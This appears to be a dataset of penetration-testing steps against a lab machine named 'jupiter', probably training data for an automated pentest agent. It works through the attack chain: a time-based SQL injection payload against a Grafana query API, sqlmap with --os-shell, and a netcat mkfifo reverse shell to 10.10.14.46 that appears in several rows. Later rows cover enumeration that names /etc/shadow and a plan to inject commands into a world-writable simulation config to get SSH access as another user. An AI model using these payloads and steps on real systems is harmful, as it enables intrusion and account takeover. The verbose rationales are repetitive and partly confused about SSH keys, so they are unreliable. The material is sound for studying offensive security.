   - The existence of a single table (`moons`) within the `public` database indicates that there may be limited data, but the elevated privileges suggest that further actions can be taken to exploit the system.
   - The information retrieved through SQLMap establishes a pathway for further exploitation, such as executing arbitrary SQL commands that could lead to a reverse shell.

   These findings suggest a promising opportunity to escalate access further. Given the DBA privileges, it is plausible to execute commands that could facilitate a reverse shell, allowing for remote access to the underlying operating system.

3. Since the previous step successfully identified a vulnerability and provided a means to exploit it, it is logical to move forward with the strategy of obtaining a reverse shell through SQL injection. This step is critical for gaining direct access to the machine, which can lead to further exploration and exploitation of the system. By leveraging the SQL injection vulnerability, we can craft a payload that executes a reverse shell command, allowing us to establish a remote connection to the target machine. This approach aligns perfectly with the goal of gaining deeper access to the system and understanding the overall security posture, making it a natural next step in the penetration testing process.",Exploit the selected exploitations,"1. The selected step of exploiting the identified SQL injection vulnerabilities to obtain a reverse shell is a logical progression from the previous findings. The prior analysis confirmed that the application is vulnerable to SQL injection, specifically through the parameter (`raw$q`) in the JSON payload of the POST request. Additionally, the successful execution of SQLMap revealed that the current user has DBA privileges, which significantly enhances the potential for exploitation.

2. The rationale behind this step includes:
   - **Confirmed Vulnerability and Privileges:** The previous step established that the application is susceptible to SQL injection and that the `grafana_viewer` user has DBA privileges. This elevated access means that we can execute more powerful SQL commands that could lead to executing system-level commands, including those required to create a reverse shell.
   - **Potential for Command Execution:** With DBA privileges, the attacker can potentially execute commands that interact with the underlying operating system. This capability opens up the possibility of creating a reverse shell, which would allow for remote control of the target machine.
   - **Strategic Use of SQL Injection:** By crafting a specific SQL injection payload that includes a command to establish a reverse shell, we can leverage the vulnerability to gain unauthorized access. This step is crucial for transitioning from merely identifying vulnerabilities to actively exploiting them for deeper access.

3. Given that the previous step successfully identified a vulnerability and provided a means to exploit it, moving forward with the strategy of obtaining a reverse shell through SQL injection is a logical and necessary step. This action is critical for gaining direct access to the machine, which can lead to further exploration of the system's security posture and potential for additional exploitation. By leveraging the SQL injection vulnerability to execute a payload that creates a reverse shell, we can establish a remote connection to the target machine, aligning perfectly with the overall goal of the penetration testing engagement. Thus, this step is not only justified but is also an essential part of the penetration testing process.",{'SQLmap': 'Exploit the SQL injection vulnerability to execute a payload that creates a reverse shell.'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}
   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}
   1.7 Target IP - 10.10.11.216",Get a reverese shell using the SQL injection,"1. The selected step of exploiting the identified SQL injection vulnerabilities to obtain a reverse shell is a logical progression from the previous findings. The prior analysis confirmed that the application is vulnerable to SQL injection, specifically through the parameter (`raw$q`) in the JSON payload of the POST request. Additionally, the successful execution of SQLMap revealed that the current user has DBA privileges, which significantly enhances the potential for exploitation.

2. The rationale behind this step includes:
   - **Confirmed Vulnerability and Privileges:** The previous step established that the application is susceptible to SQL injection and that the `grafana_viewer` user has DBA privileges. This elevated access means that we can execute more powerful SQL commands that could lead to executing system-level commands, including those required to create a reverse shell.
   - **Potential for Command Execution:** With DBA privileges, the attacker can potentially execute commands that interact with the underlying operating system. This capability opens up the possibility of creating a reverse shell, which would allow for remote control of the target machine.
   - **Strategic Use of SQL Injection:** By crafting a specific SQL injection payload that includes a command to establish a reverse shell, we can leverage the vulnerability to gain unauthorized access. This step is crucial for transitioning from merely identifying vulnerabilities to actively exploiting them for deeper access.

3. Given that the previous step successfully identified a vulnerability and provided a means to exploit it, moving forward with the strategy of obtaining a reverse shell through SQL injection is a logical and necessary step. This action is critical for gaining direct access to the machine, which can lead to further exploration of the system's security posture and potential for additional exploitation. By leveraging the SQL injection vulnerability to execute a payload that creates a reverse shell, we can establish a remote connection to the target machine, aligning perfectly with the overall goal of the penetration testing engagement. Thus, this step is not only justified but is also an essential part of the penetration testing process.","**SQLMap OS Shell Access Summary:**

- **Tool Used:** SQLMap
- **Command Executed:** `-r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1`
- **Start Time:** 07:12:43 on 2023-06-07

- **Key Findings:**
  - **Request Processing:** Parsed HTTP request from 'r1' (JSON data found in POST body).
  - **DBMS OS Fingerprinting:**
    - **Operating System:** Linux
  - **Current User Privileges:**
    - Confirmed that the current user is a Database Administrator (DBA).

- **Command Execution:**
  - Utilized the `COPY ... FROM PROGRAM ...` command for command execution.
  - Accessed the Linux OS shell.

- **Shell Output:**
  - **Whoami Command Result:** 'postgres' (indicating the shell is running as the postgres user).

- **Reverse Shell Payload:**
  - Executed the following command to establish a reverse shell:
    ```bash
    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &
    ```
  - This command sets up a named pipe and connects to a listener at IP `10.10.14.46` on port `10001`, providing an interactive shell.

**Implications:**
- Successful exploitation has provided a reverse shell as the `postgres` user, which may allow for further enumeration and potential privilege escalation within the system.
- The ability to execute commands on the server poses a significant security risk and should be addressed immediately.

**Recommendations for Further Action:**
- Investigate the extent of access obtained through the reverse shell.
- Assess potential data exposure and integrity risks.
- Implement necessary security measures to prevent unauthorized access and exploitation.",Enumerate the machine to find more information,"1. The intended task of the previous step, which involved exploiting the SQL injection vulnerability to obtain a reverse shell, was successfully achieved. The SQLMap tool was used to establish a reverse shell as the `postgres` user, granting access to the underlying operating system.

2. The key findings from this successful exploitation include:
   - Access to the machine as the `postgres` user, which is a privileged account within the PostgreSQL database environment.
   - The ability to execute system commands, which opens up opportunities for further enumeration of the machine.
   - The potential to explore files, directories, and configurations to uncover additional user accounts, privileges, and sensitive information such as credentials.

   This access provides a strong foundation for further exploration, as the next logical step is to enumerate the machine to gather more information about its configuration, users, installed software, and any potential weaknesses that can be exploited.

3. Given the successful access to the machine, it is prudent to move forward with the strategy of enumerating the machine to find more information. This step is critical for leveraging the current access to its fullest extent, as it can reveal additional user accounts, privileges, and potential vulnerabilities that could be exploited for further access or escalation. By exploring files, commands, and privileges, we can gain valuable insights into the system's security posture and identify any sensitive data that could aid in the overall penetration testing objectives. Therefore, this strategy aligns perfectly with the goal of maximizing the effectiveness of the current access and should be pursued as the next step in the penetration testing process.","Explore the suspicious files, commands and create a summary of the findings.","1. The selected step of exploring suspicious files and commands to create a summary of findings is a logical continuation of the previous successful exploitation. Having gained access to the machine as the `postgres` user through the SQL injection attack, it is crucial to leverage this access to gather more information about the system's configuration, users, and privileges.

2. The rationale behind this step includes:
   - **Access to the Operating System:** With the reverse shell established as the `postgres` user, there is an opportunity to execute various commands and navigate the filesystem. This access allows for the enumeration of files and directories that may contain sensitive information or configurations relevant to the system's security posture.
   - **Identifying Users and Privileges:** By exploring the `/etc/passwd` and `/etc/shadow` files, we can identify other user accounts on the system, along with their associated privileges. This information is vital for understanding the security landscape of the machine and determining if there are any additional accounts with elevated privileges that could be exploited.
   - **Finding Sensitive Information:** The exploration may reveal configuration files, scripts, or other data that could contain sensitive information such as passwords, API keys, or other credentials. These findings could facilitate further exploitation or lateral movement within the network.

3. Given the successful access to the machine and the potential for uncovering critical information, it is logical to proceed with the strategy of enumerating the machine to find more information. This step is essential for maximizing the value of the current access and gaining insights into the overall security posture of the system. By exploring files, commands, and user privileges, we can compile a comprehensive overview of the system, which can inform future actions and strategies in the penetration testing process. Thus, this step is not only justified but is also a necessary part of the overall engagement to ensure a thorough assessment of the target.",{'Interactive CLI': 'Execute commands to explore the filesystem and gather information about users and privileges.'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}
   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}
   1.7 Enumeration of Users and Files - {Findings: User Accounts Identified: Additional Users: juno, jovian; Commands Executed by User `juno`: rm -rf /dev/shm/shadow.data; /bin/bash /home/juno/shadow-simulation.sh; /bin/sh -c /home/juno/shadow-simulation.sh; sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE; lscpu --online --parse=CPU,CORE,SOCKET,NODE; /usr/bin/python3 -m http.server 80; Multiple instances of /usr/bin/curl -s server; cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/; Observations: User `juno` appears to be active, executing scripts every two minutes; Security Misconfiguration: The `network-simulation.yml` file has a misconfiguration that allows write access to any user.}
   1.8 Target IP - 10.10.11.216",Enumerate the machine to find more information,"1. The selected step of exploring suspicious files and commands to create a summary of findings is a logical continuation of the previous successful exploitation. Having gained access to the machine as the `postgres` user through the SQL injection attack, it is crucial to leverage this access to gather more information about the system's configuration, users, and privileges.

2. The rationale behind this step includes:
   - **Access to the Operating System:** With the reverse shell established as the `postgres` user, there is an opportunity to execute various commands and navigate the filesystem. This access allows for the enumeration of files and directories that may contain sensitive information or configurations relevant to the system's security posture.
   - **Identifying Users and Privileges:** By exploring the `/etc/passwd` and `/etc/shadow` files, we can identify other user accounts on the system, along with their associated privileges. This information is vital for understanding the security landscape of the machine and determining if there are any additional accounts with elevated privileges that could be exploited.
   - **Finding Sensitive Information:** The exploration may reveal configuration files, scripts, or other data that could contain sensitive information such as passwords, API keys, or other credentials. These findings could facilitate further exploitation or lateral movement within the network.

3. Given the successful access to the machine and the potential for uncovering critical information, it is logical to proceed with the strategy of enumerating the machine to find more information. This step is essential for maximizing the value of the current access and gaining insights into the overall security posture of the system. By exploring files, commands, and user privileges, we can compile a comprehensive overview of the system, which can inform future actions and strategies in the penetration testing process. Thus, this step is not only justified but is also a necessary part of the overall engagement to ensure a thorough assessment of the target.","**Enumeration Summary:**

- **User Accounts Identified:**
  - **Additional Users:** 
    - `juno`
    - `jovian`

- **Automated Enumeration Tool Used:** linPEAS
- **Execution Timestamp:** 2023/06/07 13:40:01

- **Commands Executed by User `juno`:**
  - **File Operations:**
    - `rm -rf /dev/shm/shadow.data`
  - **Script Execution:**
    - `/bin/bash /home/juno/shadow-simulation.sh`
    - `/bin/sh -c /home/juno/shadow-simulation.sh`
  - **System Information Commands:**
    - `sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE`
    - `lscpu --online --parse=CPU,CORE,SOCKET,NODE`
  - **HTTP Server Launch:**
    - `/usr/bin/python3 -m http.server 80`
  - **Curl Commands:**
    - Multiple instances of `/usr/bin/curl -s server` (repeated calls)
  - **File Copy Operation:**
    - `cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/`

- **Observations:**
  - User `juno` appears to be active, executing scripts every two minutes.
  - A file named `network-simulation.yml` is involved in the operations, which indicates it may be relevant to the user's activities.

- **Security Misconfiguration:**
  - **File Permission Issue:** 
    - The `network-simulation.yml` file has a misconfiguration that allows write access to any user, which could pose a security risk.

**Recommendations for Further Action:**
- Investigate the purpose of the `shadow-simulation.sh` script and the content of `network-simulation.yml` to assess potential security implications.
- Address the file permission misconfiguration on `network-simulation.yml` to restrict unauthorized access and modifications.
- Monitor the activities of user `juno` for any further suspicious behavior or potential exploitation attempts.",check the content of the network-smiulation.yml,"1. The intended task of the previous step, which involved exploring the suspicious files and commands to create a summary of findings, was successfully achieved. During this enumeration, it was discovered that there is a file named `network-simulation.yml` that has a misconfiguration allowing write access to any user. This indicates that the file may contain sensitive information or configurations that could be leveraged for further exploitation.

2. The key findings from the previous step include:
   - Identification of the `network-simulation.yml` file, which appears to be actively used by the user `juno`.
   - The file has write permissions for all users, posing a potential security risk, as it could be modified or replaced by an unauthorized user.
   - Given that `juno` is executing scripts every two minutes and appears to be actively interacting with the file, it raises the question of what information or configurations are contained within it.

   These findings suggest that checking the content of `network-simulation.yml` could provide valuable insights into the system's operations, reveal sensitive data, or even present an opportunity for further exploitation if the file contains credentials or configuration details for services running on the machine.

3. Given the successful identification of the `network-simulation.yml` file and the potential implications of its content, it is logical to proceed with the strategy of checking its content. This step is critical for understanding the nature of the file, assessing any security implications, and determining whether it can be exploited further. By reviewing the contents of this file, we can gather information that may assist in escalating privileges or accessing additional resources within the target environment. Therefore, this strategy aligns well with the overall goal of maximizing the effectiveness of our current access and should be pursued as the next step in the penetration testing process.","Explore the suspicious files, commands and create a summary of the findings.","1. The selected step of exploring the content of the `network-simulation.yml` file is a logical continuation of the previous successful enumeration of user activities and files. The previous step revealed that this file is actively used by the user `juno` and has a misconfiguration that allows write access to any user. Given these factors, it is crucial to investigate the file's contents to understand its purpose and potential implications.

2. The rationale behind this step includes:
   - **Potential Sensitive Information:** Since the `network-simulation.yml` file is named in a way that suggests it may contain configuration settings for a network simulation, it could hold critical information such as API keys, service credentials, or other sensitive data that could be exploited.
   - **User Activity Insight:** The fact that user `juno` is executing scripts that interact with this file every two minutes indicates that it plays a significant role in their activities. Understanding what this file contains can provide insights into the user's intentions and potential vulnerabilities in their operations.
   - **Security Risks:** The file's write permissions for all users present a security risk. If the file contains sensitive information, unauthorized modifications could lead to further exploitation or disruption of services. Therefore, examining its content could help identify any immediate risks or actions that need to be taken to mitigate them.

3. Given the successful identification of the `network-simulation.yml` file and its potential implications, it is logical to proceed with the strategy of exploring its content. This step is essential for determining whether the file contains exploitable information or configurations that could aid in further penetration testing efforts. By reviewing the contents of this file, we can gather valuable insights that may assist in escalating privileges, gaining additional access, or understanding the overall security posture of the target environment. Thus, this strategy is not only justified but also critical for maximizing the effectiveness of our current access and ensuring a thorough assessment of the system.",{'Interactive CLI': 'Explore the content of the network-simulation.yml file.'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}
   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}
   1.7 Enumeration of Users and Files - {Findings: User Accounts Identified: Additional Users: juno, jovian; Commands Executed by User `juno`: rm -rf /dev/shm/shadow.data; /bin/bash /home/juno/shadow-simulation.sh; /bin/sh -c /home/juno/shadow-simulation.sh; sh -c lscpu --online --parse=CPU,CORE,SOCKET,NODE; lscpu --online --parse=CPU,CORE,SOCKET,NODE; /usr/bin/python3 -m http.server 80; Multiple instances of /usr/bin/curl -s server; cp -a /home/juno/shadow/examples/http-server/network-simulation.yml /dev/shm/; Observations: User `juno` appears to be active, executing scripts every two minutes; Security Misconfiguration: The `network-simulation.yml` file has a misconfiguration that allows write access to any user.}
   1.8 Explore the content of the network-simulation.yml file - {Findings: General Configuration: Simulation Duration: Stops after 10 simulated seconds (`stop_time: 10s`); System Call Latency: Enabled to prevent busy looping during non-blocking system calls (`model_unblocked_syscall_latency: true`); Network Configuration: Network Graph Type: Utilizes a built-in network graph with a single vertex and a bandwidth of 1 Gbit (`type: 1_gbit_switch`); Host Configuration: Server Host: Hostname: `server`, Network Node ID: 0, Processes: Path: `/usr/bin/python3`, Arguments: `-m http.server 80`, Start Time: 3 seconds; Client Hosts: Hostnames: `client1`, `client2`, `client3`, Network Node ID: 0, Quantity: 3, Processes: Path: `/usr/bin/curl`, Arguments: `-s server`, Start Time: 5 seconds; Observations: The configuration file is executed automatically by user `juno` on the system; Implications: Since the configuration file can be modified, there is an opportunity to alter one of the commands to potentially gain unauthorized access to user `juno`'s account.}
   1.9 Target IP - 10.10.11.216",check the content of the network-smiulation.yml,"1. The selected step of exploring the content of the `network-simulation.yml` file is a logical continuation of the previous successful enumeration of user activities and files. The previous step revealed that this file is actively used by the user `juno` and has a misconfiguration that allows write access to any user. Given these factors, it is crucial to investigate the file's contents to understand its purpose and potential implications.

2. The rationale behind this step includes:
   - **Potential Sensitive Information:** Since the `network-simulation.yml` file is named in a way that suggests it may contain configuration settings for a network simulation, it could hold critical information such as API keys, service credentials, or other sensitive data that could be exploited.
   - **User Activity Insight:** The fact that user `juno` is executing scripts that interact with this file every two minutes indicates that it plays a significant role in their activities. Understanding what this file contains can provide insights into the user's intentions and potential vulnerabilities in their operations.
   - **Security Risks:** The file's write permissions for all users present a security risk. If the file contains sensitive information, unauthorized modifications could lead to further exploitation or disruption of services. Therefore, examining its content could help identify any immediate risks or actions that need to be taken to mitigate them.

3. Given the successful identification of the `network-simulation.yml` file and its potential implications, it is logical to proceed with the strategy of exploring its content. This step is essential for determining whether the file contains exploitable information or configurations that could aid in further penetration testing efforts. By reviewing the contents of this file, we can gather valuable insights that may assist in escalating privileges, gaining additional access, or understanding the overall security posture of the target environment. Thus, this strategy is not only justified but also critical for maximizing the effectiveness of our current access and ensuring a thorough assessment of the system.","**YAML Configuration Summary:**

- **General Configuration:**
  - **Simulation Duration:** Stops after 10 simulated seconds (`stop_time: 10s`).
  - **System Call Latency:** Enabled to prevent busy looping during non-blocking system calls (`model_unblocked_syscall_latency: true`).

- **Network Configuration:**
  - **Network Graph Type:** Utilizes a built-in network graph with a single vertex and a bandwidth of 1 Gbit (`type: 1_gbit_switch`).

- **Host Configuration:**
  - **Server Host:**
    - **Hostname:** `server`
    - **Network Node ID:** 0
    - **Processes:**
      - **Path:** `/usr/bin/python3`
      - **Arguments:** `-m http.server 80`
      - **Start Time:** 3 seconds
  - **Client Hosts:**
    - **Hostnames:** `client1`, `client2`, `client3`
    - **Network Node ID:** 0
    - **Quantity:** 3
    - **Processes:**
      - **Path:** `/usr/bin/curl`
      - **Arguments:** `-s server`
      - **Start Time:** 5 seconds

**Observations:**
- The configuration file is executed automatically by user `juno` on the system.
- The file is writable by the current user, indicating a potential security risk.

**Implications:**
- Since the configuration file can be modified, there is an opportunity to alter one of the commands to potentially gain unauthorized access to user `juno`'s account.

**Recommendations for Further Action:**
- Investigate the impact of modifying the commands within this configuration file.
- Consider implementing stricter file permissions to prevent unauthorized modifications.
- Monitor user `juno` and the execution of this configuration for any suspicious activity or attempts to exploit the writable configuration.",Try to obtain a ssh connection,"1. The intended task of the previous step, which involved exploring the content of the `network-simulation.yml` file, was successfully achieved. The findings revealed that the file is executed automatically by the user `juno` and can be modified due to its write permissions for all users. This opens up the opportunity to alter its contents to facilitate further access to the system.

2. The key findings from the previous step include:
   - The `network-simulation.yml` file allows for the execution of commands, indicating that it can be used to perform actions on the system.
   - Since the configuration file can be modified, there is an opportunity to inject commands that could help in obtaining SSH credentials. Specifically, we can craft a command to copy SSH credentials to the `/home/juno/.ssh` directory, which could include generating a public/private key pair and placing the private key in the appropriate location.
   - The ability to manipulate this file presents a direct path to escalate privileges or gain unauthorized access, particularly to the SSH service running on the machine.

3. Given the successful identification of the `network-simulation.yml` file's capabilities, it is logical to proceed with the strategy of attempting to obtain an SSH connection. This approach builds on the previous findings by leveraging the ability to modify the configuration file to facilitate SSH access. By generating a public/private key pair and placing the private key where `juno` can access it, we can potentially log in as `juno` via SSH. This step is crucial for further penetration testing efforts, as gaining SSH access could allow for more extensive exploration and exploitation of the target system. Therefore, this strategy is both justified and essential for maximizing the effectiveness of our current access.",Exploit the selected exploitations,"1. The selected step of editing the `network-simulation.yml` file to generate a private key in the `/home/juno/.ssh` directory is a logical progression from the previous findings. The exploration of the file revealed that it is executed automatically by the user `juno` and has write permissions, allowing us to modify its contents. This capability provides a unique opportunity to leverage the file for our benefit.

2. The rationale behind this step includes:
   - **Establishing SSH Access:** By modifying the `network-simulation.yml` file to include a command that generates a public/private SSH key pair, we can place the private key in the `/home/juno/.ssh` directory. This is crucial because if `juno` attempts to connect via SSH, we can use the corresponding public key to authenticate and gain access to the system.
   - **Exploiting the Misconfiguration:** The write permissions on the `network-simulation.yml` file represent a security misconfiguration that we can exploit. By injecting our command into this file, we can effectively execute it under the context of `juno`, allowing us to manipulate the environment to our advantage.
   - **Potential for Privilege Escalation:** Gaining SSH access as `juno` could lead to further escalation opportunities, especially since `juno` appears to be an active user executing scripts and commands regularly. This access could allow us to explore the system more thoroughly and identify additional vulnerabilities or sensitive information.

3. Given the successful identification of the `network-simulation.yml` file's vulnerabilities and its potential for exploitation, it is logical to proceed with the strategy of editing the file to generate an SSH key pair. This step is critical for establishing a foothold in the system, as SSH access can provide a stable and persistent means of interacting with the target environment. By executing this strategy, we can maximize our chances of successfully gaining unauthorized access and furthering our penetration testing objectives. Thus, this approach is both justified and essential for the next phase of our engagement.",{'Interactive CLI': 'Edit the network-simulation.yml file to include a command for generating an SSH key pair.'}
jupiter,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed) 
       1.3.1 Perform a port scan - {Findings: Host is up (0.13s latency). Open Ports: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu), HTTP Title: Did not follow redirect to http://jupiter.htb/, HTTP Server Header: nginx/1.18.0 (Ubuntu); Filtered Ports: 1477/tcp: Filtered, Service: capioverlan. Operating System: Linux, CPE: cpe:/o:linux:linux_kernel.}
       1.3.2 Determine the services and versions on each open port - {Findings: 22/tcp: Open, Service: SSH, Version: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1; 80/tcp: Open, Service: HTTP, Version: nginx 1.18.0 (Ubuntu).}
       1.3.3 Enumerate the HTTP service - {Findings: Discovered Subdomain: kiosk; Status Code: 200; Response Size: 34,390 bytes; Word Count: 2,150; Line Count: 212; Duration: 135 ms.}
       1.3.4 Further Enumerate the website - {Findings: Identified API Endpoint: http://kiosk.jupiter.htb/api/ds/query; Data Source: PostgreSQL database.}
   1.4 SQL Injection Testing - {Findings: Parameter Analyzed: JSON raw$q (custom POST); Type: Stacked queries; Payload Executed: {""queries"":[{""refId"":""A"",""datasource"":{""type"":""postgres"",""uid"":""Yt5Lg-Vz""},""rawSql"":""select name as \""Name\"", parent as \""Parent Planet\"", meaning as \""Name Meaning\"" from moons where parent = 'Saturn' order by name desc;SELECT PG_SLEEP(5)--"",""format"":""table"",""datasourceId"":1,""intervalMs"":60000,""maxDataPoints"":937}]; Time-Based Payload: Implemented PG_SLEEP(5) to test for SQL injection vulnerability.}
   1.5 SQL Injection Exploitation - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --time-sec=1 --current-user --current-db --hostname --is-dba --privileges --dbs --tables; Current User: grafana_viewer; Current Database (Schema): public; Current User is DBA: True; Available Databases: public; Number of Tables in 'public': 1 table; Table Name: moons; current_setting('is_superuser')}
   1.6 SQL Injection Reverse Shell - {Findings: Tool Used: SQLMap; Command Executed: -r r1 --fresh-queries --batch --dbms postgresql --os-shell --time-sec=1; Current User Privileges: Confirmed that the current user is a Database Administrator (DBA); Shell Output: Whoami Command Result: 'postgres'; Reverse Shell Payload: Executed command to establish a reverse shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|sh -i 2>&1|nc 10.10.14.46 10001 >/tmp/f &}
